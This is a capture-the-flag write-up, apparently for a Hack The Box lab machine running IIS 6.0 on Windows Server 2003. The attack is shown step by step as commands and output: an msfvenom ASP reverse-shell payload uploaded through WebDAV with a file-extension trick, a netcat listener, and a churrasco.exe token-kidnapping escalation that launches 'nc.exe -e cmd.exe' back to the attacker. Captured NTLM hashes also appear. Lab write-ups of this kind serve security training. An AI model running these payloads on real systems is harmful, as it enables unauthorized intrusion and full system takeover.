# Grandma

### Summary:

* Port 80 has webdav enabled --> exploit using [IIS5/6 WebDav Vulnerability](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability)
* PrivEsc via churrasco.exe (seImpersonate privilege enabled + win server 2003)

### Nmap

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# nmap -p 80 -A --min-rate 5000 -Pn 10.10.10.15 -oN aggr.nmap  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 20:26 EDT
Nmap scan report for 10.10.10.15
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Mon, 01 May 2023 00:27:01 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device
Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (92%), BT embedded (85%)
OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp1:professional cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_ce:5.0.1400 cpe:/h:btvision:btvision%2b_box
Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (92%), Microsoft Windows Server 2003 SP1 (92%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP1 (90%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (89%), Microsoft Windows 2000 Server SP4 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Vuln to IIS6 WebDav exploit

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability" %}

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f asp > rev.asp  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38478 bytes

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# cp rev.asp rev.txt

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# cadaver http://10.10.10.15
dav:/> put rev.txt
Uploading rev.txt to `/rev.txt':
Progress: [=============================>] 100.0% of 38478 bytes succeeded.
dav:/> copy rev.txt rev.asp;.txt
Copying `/rev.txt' to `/rev.asp;.txt':  succeeded.
dav:/> 

Browse to http://10.10.10.15/rev.asp;.txt

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# nc -lvp 443
listening on [any] 443 ...
10.10.10.15: inverse host lookup failed: Unknown host
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

### PrivEsc

```bash
C:\Documents and Settings>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 31 Minutes, 25 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 732 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,279 MB
Page File: In Use:         191 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

Vuln to Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation  (https://www.exploit-db.com/exploits/6705)

https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# python3 /usr/local/bin/smbserver.py share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.15,1041)
[*] AUTHENTICATE_MESSAGE (\,GRANNY)
[*] User GRANNY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY)
[*] User GRANNY\GRANNY$ authenticated successfully
[*] GRANNY$::HTB:7b4c75368d772b4a00000000000000000000000000000000:55b43d47ac925b9ba87b8c6ef412e2539103f2e2836c1ac1:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Closing down connection (10.10.10.15,1041)
[*] Remaining connections []

C:\WINDOWS\Temp>copy \\10.10.14.2\share\nc.exe nc.exe
copy \\10.10.14.2\share\nc.exe nc.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.2\share\churrasco.exe churrasco.exe
copy \\10.10.14.2\share\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>churrasco.exe -d "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.2 80"
churrasco.exe -d "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.2 80"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.15]
└─# nc -lvp 80
listening on [any] 80 ...
10.10.10.15: inverse host lookup failed: Unknown host
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.15] 1043
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

```
